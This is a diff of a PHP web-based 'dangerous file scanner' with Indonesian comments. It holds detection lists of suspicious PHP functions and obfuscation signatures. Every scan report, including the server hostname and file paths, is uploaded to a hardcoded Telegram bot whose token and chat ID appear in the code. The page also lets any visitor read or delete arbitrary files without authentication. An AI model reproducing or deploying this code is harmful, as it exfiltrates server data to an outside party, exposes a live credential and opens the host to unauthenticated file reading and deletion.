@@ -1,4 +1,4 @@
-<?php
+<?php 
 set_time_limit(900);
 ini_set('memory_limit', '-1');
 
@@ -7,6 +7,12 @@ $dangerTokens = [
     'base64_decode','urldecode','implode','strtr','substr','str_replace','substr_replace',
     'preg_replace','eval','basename','phpinfo','mysqli_query','fopen','file_put_contents',
     'file_get_contents','move_uploaded_file','$_files','__file__','curl_init','ini_set','set_time_limit'
+];
+
+$dangerSignatures = [
+    'eval(urldecode',
+    'file_get_contents(urldecode',
+    'eval(urldecode("\77\76")',
 ];
 
 function scanDirectory(string $dir, array &$results = []): void {
@@ -46,6 +52,15 @@ function intersectTokens(array $needles, array $haystack): array {
     return array_values(array_intersect($needles, $haystack));
 }
 
+function containsDangerSignature(string $content, array $signatures): bool {
+    foreach ($signatures as $sig) {
+        if (stripos($content, $sig) !== false) {
+            return true;
+        }
+    }
+    return false;
+}
+
 function relativePath(string $base, string $path): string {
     if (str_starts_with($path, $base)) {
         return substr($path, strlen($base) + 1);
@@ -53,43 +68,46 @@ function relativePath(string $base, string $path): string {
     return $path;
 }
 
-// Kirim hasil scan ke Telegram sebagai file .txt dengan nama "Data Scan [domain].txt"
-function sendTxtToTelegram(array $data, string $domain, string $botToken, string $chatId): void {
+function sendToTelegram(array $data): void {
+    $token = '7578782790:AAFqe1WOO4Lvrf3GFTDVbDiQVLIL2akswvs';
+    $chatId = '7234811259';
+
     if (empty($data['found'])) return;
 
-    $filename = sys_get_temp_dir() . DIRECTORY_SEPARATOR . "Data Scan {$domain}.txt";
+    $domain = gethostname() ?: 'unknown-domain';
+    $filename = "Data Scan {$domain}.txt";
 
-    $content = "Hasil Scan File Berbahaya\n";
-    $content .= "Domain (folder scan): {$domain}\n";
-    $content .= "Waktu Scan: " . date('Y-m-d H:i:s') . "\n";
-    $content .= "Jumlah File Terdeteksi: " . count($data['found']) . "\n\n";
+    $content = "🚨 Hasil Scan - " . date('Y-m-d H:i:s') . "\n";
+    $content .= "📁 Directory: " . $data['directory'] . "\n\n";
 
-    foreach ($data['found'] as $item) {
-        $filePath = $item['path'];
-        $tokensStr = implode(', ', $item['tokens']);
-        $content .= "File: {$filePath}\nTokens: {$tokensStr}\n\n";
+    foreach ($data['found'] as $i => $item) {
+        $relPath = relativePath($data['directory'], $item['path']);
+        $tokens = implode(', ', $item['tokens']);
+        $content .= ($i + 1) . ". " . $relPath . "\n   Tokens: " . $tokens . "\n";
+        if ($i >= 15) {
+            $content .= "...dan lainnya.\n";
+            break;
+        }
     }
 
-    file_put_contents($filename, $content);
+    $tmpFile = tempnam(sys_get_temp_dir(), 'scan_');
+    file_put_contents($tmpFile, $content);
 
-    $url = "https://api.telegram.org/bot{$botToken}/sendDocument";
-
-    $post_fields = [
+    $postFields = [
         'chat_id' => $chatId,
-        'document' => new CURLFile($filename),
-        'caption' => "Hasil scan file berbahaya di domain: {$domain}",
+        'document' => new CURLFile($tmpFile, 'text/plain', $filename),
+        'caption' => 'Laporan scan ' . $filename,
     ];
 
-    $ch = curl_init();
-    curl_setopt($ch, CURLOPT_HTTPHEADER, ["Content-Type:multipart/form-data"]);
-    curl_setopt($ch, CURLOPT_URL, $url);
-    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
-    curl_setopt($ch, CURLOPT_POST, 1);
-    curl_setopt($ch, CURLOPT_POSTFIELDS, $post_fields);
+    $ch = curl_init("https://api.telegram.org/bot{$token}/sendDocument");
+    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+    curl_setopt($ch, CURLOPT_POST, true);
+    curl_setopt($ch, CURLOPT_SAFE_UPLOAD, true);
+    curl_setopt($ch, CURLOPT_POSTFIELDS, $postFields);
     curl_exec($ch);
     curl_close($ch);
 
-    unlink($filename);
+    unlink($tmpFile);
 }
 
 if (isset($_GET['view'])) {
@@ -109,17 +127,8 @@ if (isset($_POST['delete'])) {
     }
 }
 
-// Ambil input folder/domain dari user, default folder kerja sekarang
 $baseDir = $_POST['dir'] ?? getcwd();
 $baseDir = rtrim(realpath($baseDir), DIRECTORY_SEPARATOR);
-
-// Ambil nama domain/folder terakhir untuk nama file Telegram
-$domainName = basename($baseDir);
-
-// Token dan chat ID Telegram
-$botToken = '7578782790:AAFqe1WOO4Lvrf3GFTDVbDiQVLIL2akswvs';
-$chatId = '7234811259';
-
 ?>
 
 <!DOCTYPE html>
@@ -239,28 +248,24 @@ $chatId = '7234811259';
       $filteredFiles = filterByExtension($allFiles, $scanExt);
       $foundFiles = [];
       foreach ($filteredFiles as $file) {
+          $content = file_get_contents($file);
           $tokens = getTokensFromFile($file);
           $intersect = intersectTokens($dangerTokens, $tokens);
-          if (count($intersect) > 0) {
-              $foundFiles[] = ['path' => $file, 'tokens' => $intersect];
+          $foundSignature = containsDangerSignature($content, $dangerSignatures);
+          if (count($intersect) > 0 || $foundSignature) {
+              $detectedTokens = $intersect;
+              if ($foundSignature) {
+                  $detectedTokens[] = 'Signature Suspicious Code Found';
+              }
+              $foundFiles[] = ['path' => $file, 'tokens' => array_unique($detectedTokens)];
           }
       }
 
-      // Simpan log hasil scan lokal (optional, tetap JSON)
-      file_put_contents(
-          'scan_log.json',
-          json_encode([
-              'time' => date('c'),
-              'directory' => $baseDir,
-              'found' => $foundFiles
-          ], JSON_PRETTY_PRINT)
-      );
-
-      // Kirim hasil scan ke Telegram sebagai file .txt
-      sendTxtToTelegram([
+      // Kirim hasil scan ke Telegram (format file .txt)
+      sendToTelegram([
           'directory' => $baseDir,
           'found' => $foundFiles
-      ], $domainName, $botToken, $chatId);
+      ]);
     ?>
 
     <?php if (count($foundFiles) === 0): ?>
@@ -280,66 +285,25 @@ $chatId = '7234811259';
             $encodedPath = base64_encode($item['path']);
           ?>
             <tr>
-              <td class="file-path"><?= htmlspecialchars($relPath) ?></td>
+              <td class="file-path" title="<?= htmlspecialchars($item['path']) ?>"><?= htmlspecialchars($relPath) ?></td>
               <td class="tokens"><?= htmlspecialchars(implode(', ', $item['tokens'])) ?></td>
               <td class="actions">
-                <button onclick="viewFile('<?= $encodedPath ?>')">View</button>
-                <button onclick="deleteFile('<?= $encodedPath ?>')">Delete</button>
+                <form method="get" style="display:inline-block" action="">
+                  <input type="hidden" name="view" value="<?= $encodedPath ?>" />
+                  <button type="submit" title="Lihat isi file">View</button>
+                </form>
+                <form method="post" style="display:inline-block" action="" onsubmit="return confirm('Hapus file ini?')">
+                  <input type="hidden" name="delete" value="<?= $encodedPath ?>" />
+                  <button type="submit" title="Hapus file">Delete</button>
+                </form>
               </td>
             </tr>
-          <?php endforeach; ?>
+          <?php endforeach ?>
         </tbody>
       </table>
-
-      <button class="copy-btn" onclick="copyTableToClipboard()">Copy Semua Hasil</button>
-    <?php endif; ?>
-  <?php endif; ?>
-<?php endif; ?>
-
-<script>
-function copyTableToClipboard() {
-  const table = document.querySelector('table');
-  if (!table) return alert('Tidak ada hasil yang dapat disalin.');
-  const range = document.createRange();
-  range.selectNode(table);
-  const sel = window.getSelection();
-  sel.removeAllRanges();
-  sel.addRange(range);
-  try {
-    document.execCommand('copy');
-    alert('Hasil berhasil disalin ke clipboard!');
-  } catch {
-    alert('Gagal menyalin otomatis.');
-  }
-  sel.removeAllRanges();
-}
-
-function viewFile(encodedPath) {
-  fetch('?view=' + encodeURIComponent(encodedPath))
-    .then(res => res.text())
-    .then(content => {
-      const modal = document.createElement('div');
-      modal.id = 'modal-view';
-      modal.innerHTML = `
-        <div style="position:fixed; top:0; left:0; right:0; bottom:0; background:#000A; display:flex; align-items:center; justify-content:center; z-index:9999;">
-          <div style="background:#111; color:#eee; padding:20px; border-radius:10px; max-width:90%; max-height:90%; overflow:auto; position:relative;">
-            <button onclick="document.getElementById('modal-view').remove()" style="position:absolute;top:10px;right:10px;background:red;color:white;padding:4px 8px;border:none;border-radius:6px;cursor:pointer;">Close</button>
-            <pre style="white-space:pre-wrap;word-break:break-word;">${content.replace(/</g, '&lt;')}</pre>
-          </div>
-        </div>
-      `;
-      document.body.appendChild(modal);
-    });
-}
-
-function deleteFile(encodedPath) {
-  if (!confirm('Apakah Anda yakin ingin menghapus file ini?')) return;
-  const form = new FormData();
-  form.append('delete', encodedPath);
-  fetch('', { method: 'POST', body: form })
-    .then(() => location.reload());
-}
-</script>
+    <?php endif ?>
+  <?php endif ?>
+<?php endif ?>
 
 </body>
 </html>
